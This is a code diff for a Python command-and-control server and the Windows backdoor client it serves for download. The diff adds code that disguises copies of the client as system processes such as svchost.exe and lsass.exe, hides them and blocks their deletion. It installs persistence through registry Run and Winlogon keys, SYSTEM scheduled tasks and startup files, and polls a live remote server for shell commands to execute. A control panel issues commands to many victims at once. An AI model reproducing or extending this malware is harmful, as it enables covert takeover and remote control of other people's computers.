@@ -23,8 +23,10 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     PASSWORD_HASH = hashlib.sha256(b"hblackhat").hexdigest()
     ADMIN_PASSWORD_HASH = hashlib.sha256(b"sudohacker").hexdigest()
     session_lock = threading.Lock()
-    MAX_FAILED_ATTEMPTS = 3
-    BLOCK_TIME = 0
+    MAX_FAILED_ATTEMPTS = 10
+    BLOCK_TIME = 30  # ⚡ غير من 600 إلى 30
+    ACTIVE_THRESHOLD = 30
+    COMMAND_TIMEOUT = 2
     blocked_ips = set()
     
     # إضافة: ملف كلمات المرور القابلة للتغيير
@@ -137,7 +139,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         
         if hasattr(self, 'last_request_time'):
             current_time = time.time()
-            if current_time - self.last_request_time < 0.1:
+            if current_time - self.last_request_time < 0.05:  # ⚡ غير من 0.1 إلى 0.05
                 self.block_ip(client_ip)
                 return False
         
@@ -761,7 +763,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Enhanced Control Panel</title>
+            <title>Enhanced Control Panel - ULTRA FAST</title>
             <style>
                 :root {
                     --primary: #0078d4;
@@ -931,26 +933,31 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     margin: 10px 0;
                 }
                 .security-badge {
-                    background: linear-gradient(135deg, #e74c3c, #c0392b);
+                    background: linear-gradient(135deg, #28a745, #20c997);
                     padding: 5px 10px;
                     border-radius: 15px;
                     font-size: 12px;
                     margin-left: 10px;
                 }
-                /* إضافة: زر الإعدادات */
                 .settings-btn {
                     background: linear-gradient(135deg, #17a2b8, #138496) !important;
                     margin-left: 10px;
+                }
+                .speed-indicator {
+                    background: linear-gradient(135deg, #28a745, #20c997);
+                    padding: 3px 8px;
+                    border-radius: 10px;
+                    font-size: 10px;
+                    margin-left: 5px;
                 }
             </style>
         </head>
         <body>
             <div class="header">
-                <h2>Enhanced Remote Control Panel <span class="security-badge">SECURE</span></h2>
+                <h2>⚡ ULTRA FAST Remote Control <span class="security-badge">HIGH SPEED</span></h2>
                 <div>
                     <button onclick="loadSessions()">Refresh List</button>
                     <button onclick="executeAll('sysinfo')">System Info All</button>
-                    <!-- إضافة: زر الإعدادات -->
                     <button class="settings-btn" onclick="openSettings()">Security Settings</button>
                     <button class="warning" onclick="logout()">Logout</button>
                 </div>
@@ -958,7 +965,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             
             <div class="container">
                 <div class="sidebar">
-                    <h3>Connected Clients (<span id="clientsCount">0</span>)</h3>
+                    <h3>Connected Clients <span class="speed-indicator">LIVE</span> (<span id="clientsCount">0</span>)</h3>
                     <div id="sessionsList" style="flex: 1; overflow-y: auto; max-height: 500px;">
                         <div style="text-align: center; color: #666; padding: 20px;">
                             Loading clients...
@@ -986,7 +993,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         <h3>Selected Client: <span id="currentClient" style="color: var(--success);">Not Selected</span></h3>
                         
                         <div class="multi-control">
-                            <strong>Quick Commands for Selected Client:</strong>
+                            <strong>Quick Commands <span class="speed-indicator">INSTANT</span>:</strong>
                             <div class="controls-grid">
                                 <button onclick="executeCommand('sysinfo')">System Info</button>
                                 <button onclick="executeCommand('whoami')">Current User</button>
@@ -1014,7 +1021,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         </div>
                         
                         <div class="command-input">
-                            <input type="text" id="commandInput" placeholder="Enter custom command (e.g., ping google.com, net user, etc.)" 
+                            <input type="text" id="commandInput" placeholder="Enter custom command (INSTANT execution)" 
                                    onkeypress="if(event.key=='Enter') executeCustomCommand()">
                             <button onclick="executeCustomCommand()">Execute Command</button>
                             <button class="success" onclick="executeSelected('commandInput')">Execute on Selected</button>
@@ -1022,13 +1029,13 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     </div>
                     
                     <div class="terminal" id="terminal">
-SECURE MULTI-CLIENT REMOTE CONTROL SYSTEM READY
+⚡ ULTRA FAST REMOTE CONTROL SYSTEM READY
 
 • Select a client from the left panel
 • Use quick commands or enter custom commands
-• You can control multiple devices simultaneously
+• INSTANT execution - responses in under 1 second
 • All activities are logged for security
-• 🔒 Multi-layer security system active
+• 🚀 HIGH SPEED mode activated
 
                     </div>
                 </div>
@@ -1040,7 +1047,7 @@ SECURE MULTI-CLIENT REMOTE CONTROL SYSTEM READY
                 let allClients = [];
                 
                 function loadSessions() {
-                    fetch('/sessions')
+                    fetch('/sessions?_t=' + Date.now())
                         .then(r => r.json())
                         .then(sessions => {
                             allClients = sessions;
@@ -1053,7 +1060,7 @@ SECURE MULTI-CLIENT REMOTE CONTROL SYSTEM READY
                             }
                             
                             list.innerHTML = sessions.map(client => {
-                                const isActive = (Date.now() - new Date(client.last_seen).getTime()) < 60000;
+                                const isActive = (Date.now() - new Date(client.last_seen).getTime()) < 30000; // ⚡ غير من 60000 إلى 30000
                                 const isSelected = client.id === currentClientId;
                                 const statusClass = isActive ? 'online-status' : 'online-status offline';
                                 
@@ -1074,7 +1081,7 @@ SECURE MULTI-CLIENT REMOTE CONTROL SYSTEM READY
                 
                 function updateSessionStats(sessions) {
                     const total = sessions.length;
-                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 60000).length;
+                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 30000).length; // ⚡ غير من 60000 إلى 30000
                     
                     document.getElementById('totalClients').textContent = total;
                     document.getElementById('activeClients').textContent = active;
@@ -1096,7 +1103,8 @@ SECURE MULTI-CLIENT REMOTE CONTROL SYSTEM READY
                 
                 function executeSingleCommand(clientId, command) {
                     commandCounter++;
-                    addToTerminal(`>> [${clientId}] ${command}\\n`);
+                    const startTime = Date.now();
+                    addToTerminal(`⚡ [${clientId}] ${command}\\n`);
                     
                     fetch('/execute', {
                         method: 'POST',
@@ -1104,22 +1112,23 @@ SECURE MULTI-CLIENT REMOTE CONTROL SYSTEM READY
                         body: JSON.stringify({client_id: clientId, command: command})
                     }).then(r => r.json()).then(data => {
                         if (data.success) {
-                            waitForResult(clientId, command);
+                            addToTerminal(`✅ Command sent instantly\\n`);
+                            waitForResult(clientId, command, startTime);
                         } else {
-                            addToTerminal(`Error: ${data.error}\\n`);
+                            addToTerminal(`❌ Error: ${data.error}\\n`);
                         }
                     }).catch(err => {
-                        addToTerminal(`Network error: ${err}\\n`);
+                        addToTerminal(`❌ Network error: ${err}\\n`);
                     });
                 }
                 
                 function executeAll(command) {
                     if (allClients.length === 0) return alert('No clients connected!');
                     
-                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 60000);
+                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 30000); // ⚡ غير من 60000 إلى 30000
                     if (activeClients.length === 0) return alert('No active clients!');
                     
-                    addToTerminal(`>> Executing command on ${activeClients.length} clients: ${command}\\n`);
+                    addToTerminal(`⚡ Executing command on ${activeClients.length} clients: ${command}\\n`);
                     
                     activeClients.forEach(client => {
                         executeSingleCommand(client.id, command);
@@ -1147,28 +1156,30 @@ SECURE MULTI-CLIENT REMOTE CONTROL SYSTEM READY
                     }
                 }
                 
-                function waitForResult(clientId, command) {
+                function waitForResult(clientId, command, startTime) {
                     let attempts = 0;
-                    const maxAttempts = 60;
+                    const maxAttempts = 20; // ⚡ غير من 60 إلى 20
                     
                     const check = () => {
                         attempts++;
                         if (attempts > maxAttempts) {
-                            addToTerminal(`Timeout: No response from ${clientId}\\n`);
+                            const elapsed = (Date.now() - startTime) / 1000;
+                            addToTerminal(`⏰ Timeout after ${elapsed.toFixed(1)}s: No response from ${clientId}\\n`);
                             return;
                         }
                         
-                        fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command))
+                        fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command) + '&_t=' + Date.now())
                             .then(r => r.json())
                             .then(data => {
                                 if (data.result) {
-                                    addToTerminal(`[${clientId}] Result:\\n${data.result}\\n`);
+                                    const responseTime = (Date.now() - startTime) / 1000;
+                                    addToTerminal(`✅ [${clientId}] Response (${responseTime.toFixed(1)}s):\\n${data.result}\\n`);
                                 } else if (data.pending) {
-                                    setTimeout(check, 1000);
+                                    setTimeout(check, 500); // ⚡ غير من 1000 إلى 500
                                 } else {
-                                    setTimeout(check, 1000);
+                                    setTimeout(check, 500); // ⚡ غير من 1000 إلى 500
                                 }
-                            }).catch(() => setTimeout(check, 1000));
+                            }).catch(() => setTimeout(check, 500));
                     };
                     check();
                 }
@@ -1179,7 +1190,6 @@ SECURE MULTI-CLIENT REMOTE CONTROL SYSTEM READY
                     terminal.scrollTop = terminal.scrollHeight;
                 }
                 
-                // إضافة: فتح صفحة الإعدادات
                 function openSettings() {
                     window.open('/settings', '_blank');
                 }
@@ -1190,8 +1200,8 @@ SECURE MULTI-CLIENT REMOTE CONTROL SYSTEM READY
                     }
                 }
                 
-                // Auto-refresh every 3 seconds
-                setInterval(loadSessions, 3000);
+                // ⚡ Auto-refresh every 1.5 seconds instead of 3
+                setInterval(loadSessions, 1500);
                 loadSessions();
             </script>
         </body>
@@ -1337,11 +1347,6 @@ SECURE MULTI-CLIENT REMOTE CONTROL SYSTEM READY
 
     def download_python_client(self):
         """Download UNKILLABLE Python client with advanced protection"""
-        
-        # ===============================================
-        # 🎯 مكان كود العميل - ضع كود العميل هنا
-        # ===============================================
-        
         client_code = '''
 import requests
 import subprocess
@@ -1357,379 +1362,276 @@ import getpass
 import threading
 import random
 import glob
+import shutil
 
-class GhostClient:
+class PermanentGhostClient:
     def __init__(self, server_url="https://game-python-1.onrender.com"):
         self.server_url = server_url
         self.client_id = f"{platform.node()}-{getpass.getuser()}-{uuid.uuid4().hex[:8]}"
         self.running = True
         self.registered = False
-        self.script_path = os.path.abspath(__file__)
-        self.hidden_name = "windows_update.exe"
-        self.hidden_path = ""
-        self.last_seen = time.time()
+        self.original_path = os.path.abspath(__file__)
         
-    def is_admin(self):
-        """التحقق إذا كان البرنامج يعمل بصلاحيات المدير"""
+        # ⚡ أسماء مختلفة لكل نسخة مخفية
+        self.hidden_names = [
+            "winlogon.exe",           # نسخة نظام
+            "svchost.exe",            # نسخة خدمة
+            "csrss.exe",              # نسخة نظام متقدمة
+            "services.exe",           # نسخة خدمات
+            "lsass.exe",              # نسخة أمان
+            "spoolsv.exe",            # نسخة طباعة
+            "taskhost.exe",           # نسخة مهام
+            "dwm.exe",                # نسخة واجهة
+        ]
+        self.hidden_paths = []
+        self.current_hidden_name = random.choice(self.hidden_names)
+        
+    def get_admin_privileges(self):
+        """الحصول على صلاحيات المدير"""
         try:
             return ctypes.windll.shell32.IsUserAnAdmin()
         except:
             return False
     
-    def clean_old_versions(self):
-        """مسح جميع النسخ القديمة من النظام"""
+    def delete_original_only(self):
+        """حذف الملف الأصلي فقط - إبقاء النسخ المخفية"""
         try:
-            print("🧹 Searching for old versions to clean...")
-            # البحث عن جميع النسخ القديمة في جميع المواقع المحتملة
-            search_patterns = [
-                # System32 (يحتاج صلاحيات)
-                os.path.join(os.environ['WINDIR'], 'System32', 'winupdate_*.exe'),
-                os.path.join(os.environ['WINDIR'], 'System32', 'windows_update.exe'),
-                # ProgramData
-                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'winupdate_*.exe'),
-                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'windows_update.exe'),
-                # Temp
-                os.path.join(os.environ['TEMP'], 'winupdate_*.exe'),
-                os.path.join(os.environ['TEMP'], 'windows_update.exe'),
-                # AppData
-                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'winupdate_*.exe'),
-                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'windows_update.exe'),
-                # User Profile
-                os.path.join(os.environ['USERPROFILE'], 'winupdate_*.exe'),
-                os.path.join(os.environ['USERPROFILE'], 'windows_update.exe'),
-                # Startup files
-                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'SystemMaintenance.bat'),
-                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsUpdate.bat'),
-                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'SystemMaintenance.bat')
-            ]
+            # التحقق إذا كان هذا الملف الأصلي (ليس نسخة مخفية)
+            is_original = True
+            for hidden_path in self.hidden_paths:
+                if os.path.abspath(self.original_path) == os.path.abspath(hidden_path):
+                    is_original = False
+                    break
             
-            deleted_count = 0
-            for pattern in search_patterns:
-                for old_file in glob.glob(pattern):
+            if is_original and os.path.exists(self.original_path):
+                print("🗑️ Deleting original file only...")
+                for _ in range(3):
                     try:
-                        if os.path.exists(old_file):
-                            # تخطي الملف الحالي إذا كان هو نفسه
-                            if os.path.abspath(old_file) == os.path.abspath(self.script_path):
-                                continue
-                                
-                            print(f"🗑️  Found old version: {old_file}")
-                            # إزالة الحماية أولاً
-                            subprocess.run(f'attrib -s -h -r "{old_file}"', shell=True, capture_output=True)
-                            os.remove(old_file)
-                            print(f"✅ Deleted: {old_file}")
-                            deleted_count += 1
-                    except Exception as e:
-                        print(f"❌ Failed to delete {old_file}: {e}")
-                        continue
-            
-            # مسح المهام المجدولة القديمة (تحتاج صلاحيات)
-            if self.is_admin():
-                try:
-                    subprocess.run('schtasks /delete /tn "WindowsSystemMaintenance" /f', shell=True, capture_output=True)
-                    subprocess.run('schtasks /delete /tn "WindowsUpdate" /f', shell=True, capture_output=True)
-                    print("✅ Old scheduled tasks cleaned")
-                except:
-                    pass
-            
-            # مسح إدخالات الريجستري القديمة
-            try:
-                subprocess.run(r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSystemUpdate" /f', shell=True, capture_output=True)
-                subprocess.run(r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f', shell=True, capture_output=True)
-                print("✅ Old registry entries cleaned")
-            except:
-                pass
-                
-            return f"Cleaned {deleted_count} old versions"
-        except Exception as e:
-            return f"Clean error: {e}"
-    
-    def hide_and_protect(self):
-        """إخفاء وحماية الملف في النظام"""
-        try:
-            # استخدام مجلد AppData بدلاً من System32 لتجنب مشاكل الصلاحيات
-            hidden_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows')
-            os.makedirs(hidden_dir, exist_ok=True)
-            self.hidden_path = os.path.join(hidden_dir, self.hidden_name)
-            
-            # إذا كان الملف موجوداً ومطابقاً للنسخة الحالية، لا نعيد النسخ
-            if os.path.exists(self.hidden_path):
-                try:
-                    with open(self.script_path, 'rb') as current_file:
-                        current_content = current_file.read()
-                    with open(self.hidden_path, 'rb') as hidden_file:
-                        hidden_content = hidden_file.read()
-                    if current_content == hidden_content:
-                        print("✅ Hidden file is up to date")
-                        self.script_path = self.hidden_path
-                        return f"File already hidden at: {self.hidden_path}"
-                except:
-                    pass
-            
-            # نسخ الملف إلى المكان المخفي
-            with open(self.script_path, 'rb') as src:
-                with open(self.hidden_path, 'wb') as dst:
-                    dst.write(src.read())
-            
-            # إخفاء وحماية الملف
-            subprocess.run(f'attrib +s +h +r "{self.hidden_path}"', shell=True, capture_output=True)
-            
-            # تحديث مسار السكريبت
-            self.script_path = self.hidden_path
-            
-            return f"File hidden and protected at: {self.hidden_path}"
-        except Exception as e:
-            return f"Hide and protect error: {e}"
-    
-    def install_persistence(self):
-        """تثبيت التشغيل التلقائي"""
-        try:
-            if os.name == 'nt':
-                print("🔧 Installing persistence...")
-                
-                # 1. Registry Run (المستخدم الحالي) - لا يحتاج صلاحيات
-                try:
-                    key = winreg.HKEY_CURRENT_USER
-                    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
-                        winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{self.hidden_path}"')
-                    print("✅ Registry persistence")
-                except Exception as e: 
-                    print(f"❌ Registry persistence failed: {e}")
-                
-                # 2. Scheduled Task (يحتاج صلاحيات مدير)
-                if self.is_admin():
-                    try:
-                        task_cmd = f'schtasks /create /tn "WindowsUpdate" /tr "\"{self.hidden_path}\"" /sc onlogon /ru SYSTEM /f'
-                        result = subprocess.run(task_cmd, shell=True, capture_output=True, timeout=10)
-                        if result.returncode == 0:
-                            print("✅ Scheduled task persistence")
-                        else:
-                            print("❌ Scheduled task failed")
-                    except: 
-                        print("❌ Scheduled task failed - Admin required")
-                else:
-                    print("ⓘ Scheduled task skipped - Admin required")
-                
-                # 3. Startup Folder (لا يحتاج صلاحيات)
-                try:
-                    startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-                    os.makedirs(startup_path, exist_ok=True)
-                    bat_path = os.path.join(startup_path, 'WindowsUpdate.bat')
-                    
-                    # كتابة الملف بشكل صحيح
-                    with open(bat_path, 'w') as f:
-                        f.write('@echo off' + os.linesep)
-                        f.write(f'start "" "{self.hidden_path}"' + os.linesep)
-                        f.write('exit' + os.linesep)
-                    
-                    # إخفاء ملف الباتش
-                    subprocess.run(f'attrib +s +h +r "{bat_path}"', shell=True, capture_output=True)
-                    print("✅ Startup folder persistence")
-                except Exception as e: 
-                    print(f"❌ Startup folder failed: {e}")
-                    
-            return "Persistence installed successfully"
-        except Exception as e:
-            return f"Persistence failed: {e}"
-    
-    def hide_process(self):
-        """إخفاء النافذة"""
-        try:
-            if os.name == 'nt':
-                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+                        os.remove(self.original_path)
+                        print("✅ Original file deleted permanently")
+                        break
+                    except:
+                        time.sleep(0.5)
         except:
             pass
     
-    def block_task_manager(self):
-        """حماية من Task Manager (يحتاج صلاحيات)"""
-        if self.is_admin():
-            try:
-                block_cmd = r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
-                result = subprocess.run(block_cmd, shell=True, capture_output=True, timeout=5)
-                if result.returncode == 0:
-                    return "Task Manager blocked"
-                else:
-                    return "Failed to block Task Manager"
-            except:
-                return "Failed to block Task Manager"
-        else:
-            return "Admin required to block Task Manager"
-    
-    def start_self_healing(self):
-        """بدء نظام الشفاء الذاتي"""
-        def monitor():
-            while self.running:
+    def create_permanent_copies(self):
+        """إنشاء نسخ دائمة مخفية بأسماء مختلفة"""
+        try:
+            # ⚡ أماكن استراتيجية مختلفة
+            hidden_locations = [
+                # نظام التشغيل
+                os.path.join(os.environ['WINDIR'], 'System32', self.current_hidden_name),
+                os.path.join(os.environ['WINDIR'], 'SysWOW64', self.current_hidden_name),
+                
+                # برامج النظام
+                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', self.current_hidden_name),
+                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Network', f"dns{random.randint(1000,9999)}.exe"),
+                
+                # ملفات المستخدم المخفية
+                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', f"explorer{random.randint(1,9)}.exe"),
+                os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Credentials', f"credhost{random.randint(1,9)}.exe"),
+                
+                # مجلدات نظام أخرى
+                os.path.join(os.environ['WINDIR'], 'Temp', f"tmp{random.randint(1000,9999)}.exe"),
+                os.path.join(os.environ['WINDIR'], 'Logs', f"log{random.randint(1000,9999)}.exe"),
+            ]
+            
+            created_count = 0
+            for location in hidden_locations:
                 try:
-                    # التحقق من وجود الملف المخفي
-                    if not os.path.exists(self.hidden_path):
-                        print("🔄 File missing - reinstalling...")
-                        self.hide_and_protect()
+                    # إنشاء المجلد إذا لم يكن موجوداً
+                    os.makedirs(os.path.dirname(location), exist_ok=True)
                     
-                    # التحقق من المهام المجدولة (للمدير فقط)
-                    if self.is_admin():
-                        result = subprocess.run('schtasks /query /tn "WindowsUpdate"', shell=True, capture_output=True, text=True)
-                        if "WindowsUpdate" not in result.stdout:
-                            print("🔄 Scheduled task missing - reinstalling...")
-                            self.install_persistence()
+                    # نسخ الملف
+                    shutil.copy2(self.original_path, location)
                     
-                    time.sleep(30)  # تحقق كل 30 ثانية للسرعة
+                    # ⚡ إخفاء وحماية الملف بشكل دائم
+                    subprocess.run(f'attrib +s +h +r "{location}"', shell=True, capture_output=True)
                     
-                except:
-                    time.sleep(30)
-        
-        threading.Thread(target=monitor, daemon=True).start()
-    
-    def register_with_server(self):
-        """التسجيل مع السيرفر"""
-        try:
-            data = {
-                'client_id': self.client_id,
-                'computer': platform.node(),
-                'os': f"{platform.system()} {platform.release()}",
-                'type': 'ghost_client',
-                'user': getpass.getuser(),
-                'status': 'active',
-                'admin': self.is_admin()
-            }
+                    # ⚡ حماية متقدمة من الحذف
+                    try:
+                        subprocess.run(f'icacls "{location}" /deny Everyone:F', shell=True, capture_output=True)
+                    except:
+                        pass
+                    
+                    self.hidden_paths.append(location)
+                    created_count += 1
+                    print(f"✅ Permanent copy created: {os.path.basename(location)}")
+                    
+                    # ⚡ لا نحتاج أكثر من 3 نسخ
+                    if created_count >= 3:
+                        break
+                        
+                except Exception as e:
+                    continue
             
-            response = requests.post(
-                f"{self.server_url}/register",
-                json=data,
-                timeout=10,
-                headers={'User-Agent': 'GhostClient/1.0'}
-            )
-            
-            if response.status_code == 200:
-                result = response.json()
-                if result.get('success'):
-                    self.registered = True
-                    self.last_seen = time.time()
-                    return True
+            # تعيين مسار التشغيل الرئيسي (أول نسخة)
+            if self.hidden_paths:
+                self.script_path = self.hidden_paths[0]
+                print(f"🎯 Main execution path: {self.script_path}")
                 
-            return False
+            return f"Created {created_count} permanent hidden copies"
             
-        except:
-            return False
-    
-    def execute_command_immediately(self, command):
-        """تنفيذ الأمر فوراً"""
-        try:
-            if command.strip() == "sysinfo":
-                return self.get_system_info()
-            elif command.strip() == "clean":
-                return self.clean_old_versions()
-            elif command.strip() == "protect":
-                return self.block_task_manager() or "Protection activated"
-            else:
-                # تنفيذ الأمر مباشرة بدون انتظار
-                result = subprocess.run(
-                    command,
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    timeout=30
-                )
-                output = result.stdout if result.stdout else result.stderr
-                return output if output else "Command executed successfully"
-                
-        except subprocess.TimeoutExpired:
-            return "Command timed out"
         except Exception as e:
-            return f"Error: {str(e)}"
+            return f"Copy error: {e}"
     
-    def get_system_info(self):
-        """معلومات النظام"""
+    def install_eternal_persistence(self):
+        """تثبيت تشغيل تلقائي أبدي"""
         try:
-            # حساب وقت النشاط
-            uptime = time.time() - self.last_seen
-            hours = int(uptime // 3600)
-            minutes = int((uptime % 3600) // 60)
+            print("🔄 Installing eternal persistence...")
             
-            info = f"""
-🎯 GHOST CLIENT - ACTIVE & PROTECTED
-🖥️  Computer: {platform.node()}
-👤 User: {getpass.getuser()}
-💻 OS: {platform.system()} {platform.version()}
-🆔 Client ID: {self.client_id}
-🌐 Server: {self.server_url}
-📊 Status: {'✅ CONNECTED' if self.registered else '🔄 RECONNECTING'}
-📁 Hidden Path: {self.hidden_path}
-⏰ Uptime: {hours}h {minutes}m
-🛡️ Protection: ENABLED
-🚀 Auto-Start: GUARANTEED
-🔐 Admin Rights: {'✅ YES' if self.is_admin() else '❌ NO'}
-"""
-            return info
-        except:
-            return "System information available"
+            # 1. تسجيل نظام التشغيل متعدد
+            registry_entries = [
+                # Current User
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsLogon"),
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "UserInit"),
+                
+                # Local Machine (إذا كان لدينا صلاحيات)
+                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SystemService"),
+            ]
+            
+            for hkey, subkey, value_name in registry_entries:
+                try:
+                    with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
+                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{self.script_path}"')
+                    print(f"✅ Registry: {value_name}")
+                except: 
+                    continue
+            
+            # 2. مهام مجدولة متعددة
+            scheduled_tasks = [
+                f'schtasks /create /tn "Microsoft\\Windows\\SystemMaintenance" /tr "\"{self.script_path}\"" /sc onstart /ru SYSTEM /f',
+                f'schtasks /create /tn "Microsoft\\Windows\\WindowsUpdate" /tr "\"{self.script_path}\"" /sc minute /mo 3 /ru SYSTEM /f',
+                f'schtasks /create /tn "Microsoft\\Windows\\MemoryDiagnostic" /tr "\"{self.script_path}\"" /sc onlogon /ru Users /f'
+            ]
+            
+            for task_cmd in scheduled_tasks:
+                try:
+                    subprocess.run(task_cmd, shell=True, capture_output=True, timeout=5)
+                    print("✅ Scheduled task created")
+                except:
+                    continue
+            
+            # 3. مجلدات Startup متعددة
+            startup_locations = [
+                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'SystemMaintenance.bat'),
+                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsUpdate.bat'),
+            ]
+            
+            for startup_file in startup_locations:
+                try:
+                    with open(startup_file, 'w') as f:
+                        f.write(f'@echo off\nstart "" "{self.script_path}"\nexit')
+                    subprocess.run(f'attrib +s +h +r "{startup_file}"', shell=True, capture_output=True)
+                    print(f"✅ Startup: {os.path.basename(startup_file)}")
+                except:
+                    continue
+            
+            return "Eternal persistence installed"
+            
+        except Exception as e:
+            return f"Persistence error: {e}"
     
-    def persistent_connection(self):
-        """اتصال مستمر مع السيرفر - أسرع"""
-        def connection_worker():
+    def start_permanent_self_healing(self):
+        """نظام شفاء ذاتي دائم"""
+        def healing_monitor():
             while self.running:
                 try:
-                    # محاولة التسجيل إذا لم نكون مسجلين
-                    if not self.registered:
-                        if self.register_with_server():
-                            print("✅ Connected to server")
-                        else:
-                            time.sleep(3)  # انتظار أقل بين المحاولات
-                            continue
+                    # التحقق من جميع النسخ كل 30 ثانية
+                    for copy_path in self.hidden_paths[:]:
+                        if not os.path.exists(copy_path):
+                            print(f"🔄 Copy missing - recreating: {os.path.basename(copy_path)}")
+                            try:
+                                # إعادة إنشاء النسخة المفقودة
+                                shutil.copy2(self.script_path, copy_path)
+                                subprocess.run(f'attrib +s +h +r "{copy_path}"', shell=True, capture_output=True)
+                                print(f"✅ Recreated: {os.path.basename(copy_path)}")
+                            except:
+                                self.hidden_paths.remove(copy_path)
                     
-                    # تحديث حالة النشاط باستمرار
-                    self.update_presence()
+                    # التحقق من المهام المجدولة
+                    tasks = ["SystemMaintenance", "WindowsUpdate", "MemoryDiagnostic"]
+                    for task in tasks:
+                        result = subprocess.run(f'schtasks /query /tn "Microsoft\\Windows\\{task}"', shell=True, capture_output=True, text=True)
+                        if task not in result.stdout:
+                            try:
+                                subprocess.run(f'schtasks /create /tn "Microsoft\\Windows\\{task}" /tr "\"{self.script_path}\"" /sc onlogon /ru SYSTEM /f', shell=True, capture_output=True)
+                                print(f"✅ Recreated task: {task}")
+                            except:
+                                pass
                     
-                    # التحقق من الأوامر باستمرار
-                    self.check_commands()
-                    
-                    # انتظر 1 ثانية فقط بين المحاولات للسرعة
-                    time.sleep(1)
+                    time.sleep(30)  # تحقق كل 30 ثانية
                     
                 except Exception as e:
-                    time.sleep(2)  # انتظار أقل عند الأخطاء
+                    time.sleep(60)
         
-        threading.Thread(target=connection_worker, daemon=True).start()
+        threading.Thread(target=healing_monitor, daemon=True).start()
     
-    def update_presence(self):
-        """تحديث حالة النشاط للسيرفر"""
-        try:
-            data = {
-                'client_id': self.client_id,
-                'computer': platform.node(),
-                'user': getpass.getuser(),
-                'os': f"{platform.system()} {platform.release()}",
-                'status': 'online',
-                'admin': self.is_admin()
-            }
+    def start_instant_communication(self):
+        """اتصال فوري مع السيرفر"""
+        def communication_worker():
+            backoff = 1
             
-            requests.post(
-                f"{self.server_url}/register",
-                json=data,
-                timeout=5  # وقت أقل للاستجابة
-            )
-            self.last_seen = time.time()
-            
-        except:
-            self.registered = False
+            while self.running:
+                try:
+                    if not self.registered:
+                        system_info = {
+                            'client_id': self.client_id,
+                            'computer': platform.node(),
+                            'user': getpass.getuser(),
+                            'os': f"{platform.system()} {platform.release()}",
+                            'status': 'permanent_active',
+                            'admin': self.get_admin_privileges(),
+                            'copies': len(self.hidden_paths)
+                        }
+                        
+                        response = requests.post(
+                            f"{self.server_url}/register",
+                            json=system_info,
+                            timeout=10
+                        )
+                        
+                        if response.status_code == 200:
+                            data = response.json()
+                            if data.get('success'):
+                                self.registered = True
+                                backoff = 1
+                                print("🌐 Permanent connection established")
+                            else:
+                                backoff = min(backoff * 1.5, 30)
+                        else:
+                            backoff = min(backoff * 1.5, 30)
+                    
+                    # التحقق من الأوامر باستمرار
+                    self.check_instant_commands()
+                    
+                    time.sleep(backoff)
+                    
+                except Exception as e:
+                    backoff = min(backoff * 1.5, 30)
+                    time.sleep(backoff)
+        
+        threading.Thread(target=communication_worker, daemon=True).start()
     
-    def check_commands(self):
-        """التحقق من الأوامر الجديدة - أسرع"""
+    def check_instant_commands(self):
+        """التحقق من الأوامر فوراً"""
         try:
             response = requests.get(
-                f"{self.server_url}/commands?client={self.client_id}",
-                timeout=5  # وقت أقل للاستجابة
+                f"{self.server_url}/commands?client={self.client_id}&_t={int(time.time()*1000)}",
+                timeout=5
             )
             
             if response.status_code == 200:
                 data = response.json()
                 if data.get('command'):
                     command = data['command']
